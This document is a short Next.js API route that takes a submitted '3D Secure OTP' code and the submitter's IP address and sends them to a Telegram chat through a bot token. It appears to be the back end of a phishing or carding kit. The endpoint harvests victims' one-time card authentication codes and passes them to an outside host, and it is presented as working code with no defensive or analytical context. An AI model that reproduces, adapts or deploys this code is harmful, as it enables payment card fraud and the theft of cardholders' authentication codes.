import { NextResponse } from "next/server"
import { headers } from "next/headers"

export async function POST(request: Request) {
  try {
    const { otp } = await request.json()

    // Get user IP address
    const headersList = await headers()
    const forwardedFor = headersList.get("x-forwarded-for")
    const realIp = headersList.get("x-real-ip")
    const userIp = forwardedFor?.split(",")[0] || realIp || "Unknown"

    const botToken = process.env.TELEGRAM_BOT_TOKEN
    const chatId = process.env.TELEGRAM_CHAT_ID

    if (!botToken || !chatId) {
      return NextResponse.json({ error: "Telegram configuration missing" }, { status: 500 })
    }

    const message = `🔐 *3D Secure OTP Attempt*

*OTP Code:* \`${otp}\`
*IP Address:* \`${userIp}\`
*Timestamp:* ${new Date().toLocaleString()}`

    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`

    const response = await fetch(telegramUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: "Markdown",
      }),
    })

    if (!response.ok) {
      throw new Error("Failed to send message to Telegram")
    }

    return NextResponse.json({ success: true })
  } catch (error) {
    console.error("Error sending OTP to Telegram:", error)
    return NextResponse.json({ error: "Failed to process OTP" }, { status: 500 })
  }
}
